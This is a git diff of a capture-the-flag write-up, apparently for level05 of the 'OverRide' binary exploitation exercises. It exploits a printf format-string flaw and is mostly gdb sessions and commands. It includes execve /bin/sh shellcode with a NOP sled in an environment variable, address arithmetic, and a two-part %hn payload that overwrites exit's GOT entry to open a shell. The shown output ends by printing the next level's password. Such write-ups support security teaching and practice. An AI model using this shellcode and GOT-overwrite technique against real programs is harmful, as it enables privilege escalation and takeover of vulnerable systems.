@@ -32,24 +32,22 @@ aaaa0x64 0xf7fcfac0 0xf7ec3af9 0xffffd6df 0xffffd6de (nil) 0xffffffff 0xffffd764
 Our string is printed at the 10th parameter.
 
 We put our shellcode in an environment variable and find its address:
-
-Nous pouvons voir que notre string 'aaaa' apparait au printf access parameter numero 10  
   
 ```bash
 export EXPLOIT=$(python -c "print '\x90' * 400 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")  
 ```
+
 ```gdb
 (gdb) x/s *((char **)environ+0)  
 0xffffd74a:      "EXPLOIT=<...>"  
-  
+
 adresse exploit: 0xffffd74a  
   
 (gdb) p/x 0xffffd74a+200  
-$2 = 0xffffd812  
-(gdb) x/s 0xffffd812  
+$2 = 0xffffd812
 ```
   
-We get exit function address:
+Let's find exit function address:
 
 ```gdb
 (gdb) info function exit  
@@ -64,70 +62,68 @@ Dump of assembler code for function exit@plt:
    0x08048370 <+0>:     jmp    *0x80497e0
    0x08048376 <+6>:     push   $0x18
    0x0804837b <+11>:    jmp    0x8048330
-  
-(gdb) r <<<$(python -c "print '\xe0\x97\x04\x08' + %4294957070\$x + '%10\$n'")
-0x0804847a in main ()
-(gdb) x/wx $esp
-0xffffd690:     0xffffd6b8
-(gdb) x/5wx 0xffffd6b8
-0xffffd6b8:     0x080497e0      0x39323425      0x37353934      0x24303730
-0xffffd6c8:     0x00000a6e
-Breakpoint 2, 0x08048507 in main ()
-(gdb) x/5wx 0xffffd6b8
-0xffffd6b8:     0x080497e0      0x39323425      0x37353934      0x24303730
-0xffffd6c8:     0x00000a6e
-```  
+(gdb) x/wx 0x80497e0
+0x80497e0 <exit@got.plt>:       0x08048376
+```
 
-Nous pouvons voir que les bytes que nous avons rentrer dans le fgets() ne sont pas modifier, mais que nous n'avons pas jump sur notre shellcode
-  
-Nous pouvons voir sur ce document, que les valeurs des int pris en compte par printf ont une limite :  
-https://cs155.stanford.edu/papers/formatstring-1.2.pdf  
-  
-Comme a sa section 4.1 (Short write), nous allons passer notre adresse en deux fois afin de ne pas depasser cette limite. 
-  
+Let's try to overwrite `exit` jump:
+
 ```gdb
-(gdb) p/d 0xd812  
-$4 = 55314  
-(gdb) p/d 0xd812-8  
-$5 = 55306  
+Starting program: /home/users/level05/level05 <<<$(python -c "print '\xe0\x97\x04\x08' + '%4294957070x%10\$n'")
+
+Breakpoint 1, 0x08048507 in main ()
+(gdb) x/2wx 0x80497e0
+0x80497e0 <exit@got.plt>:       0x08048376      0xf7e45420
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x0804850c in main ()
+(gdb) x/2wx 0x80497e0
+0x80497e0 <exit@got.plt>:       0x08048376      0xf7e45420
+```
+
+We can see that the address has not been overwritten. We need to split it to lower value.
+
+We split the address and substract the two address that will be printed. For the 2nd value, we substract the length already written: 
+
+```gdb
+(gdb) p/x 4294957070
+$1 = 0xffffd80e
+(gdb) p/d 0xd80e
+$2 = 55310
+(gdb) p/d 0xd80e - 8
+$3 = 55302
   
 gdb-peda$ p/d 0xffff  
 $5 = 65535  
-(gdb) p/d 0xffff-55314  
-$6 = 10221
+(gdb) p/d 0xffff-55310  
+$6 = 10225
 ```
-```gdb
-(gdb) r <<<$(python -c "print '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%.55306u%10\$hn' + '%.10221u%11\$hn'")  
-=> 0x08048507 <+195>:   call   0x8048340 <printf@plt>
-(gdb) disas 0x8048370
-Dump of assembler code for function exit@plt:
-   0x08048370 <+0>:     jmp    DWORD PTR ds:0x80497e0
-   0x08048376 <+6>:     push   0x18
-   0x0804837b <+11>:    jmp    0x8048330
-End of assembler dump.
-(gdb) disas 0x80497e0
-Dump of assembler code for function exit@got.plt:
-   0x080497e0 <+0>:     jbe    0x8049765 <_DYNAMIC+105>
-   0x080497e2 <+2>:     add    al,0x8
-End of assembler dump.
 
-=> 0x0804850c <+200>:   mov    DWORD PTR [esp],0x0
-(gdb) disas 0x8048370
-Dump of assembler code for function exit@plt:
-   0x08048370 <+0>:     jmp    DWORD PTR ds:0x80497e0
-   0x08048376 <+6>:     push   0x18
-   0x0804837b <+11>:    jmp    0x8048330
-End of assembler dump.
-(gdb) disas 0x80497e0
-Dump of assembler code for function exit@got.plt:
-   0x080497e0 <+0>:     adc    bl,al
-   0x080497e2 <+2>:     (bad)  
-   0x080497e3 <+3>:     jmp    DWORD PTR [eax]
-End of assembler dump.
+```gdb
+Starting program: /home/users/level05/level05 <<<$(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55302u%10$hn" + "%10225u%11$hn")')
+
+Breakpoint 1, 0x08048507 in main ()
+(gdb) x/2wx 0x80497e0
+0x80497e0 <exit@got.plt>:       0x08048376      0xf7e45420
+(gdb) c
+...
+Breakpoint 2, 0x0804850c in main ()
+(gdb) x/2wx 0x80497e0
+0x80497e0 <exit@got.plt>:       0xffffd80e      0xf7e45420
+(gdb) x/12wx 0xffffd80e
+0xffffd80e:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd81e:     0x90909090      0x90909090      0x90909090      0x90909090
+0xffffd82e:     0x90909090      0x90909090      0x90909090      0x90909090
 ```
+
+Exit seems to have been overwritten. Let's try to exploit:
+
 ```bash
-(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%.55306u%10$hn" + "%.10221u%11$hn")'; cat) | ./level05  
+level05@OverRide:~$ (python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%55302u%10$hn" + "%10225u%11$hn")'; cat) | ./level05
 <...>  
-whoami  
-level06  
+whoami 
+level06
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
 ```
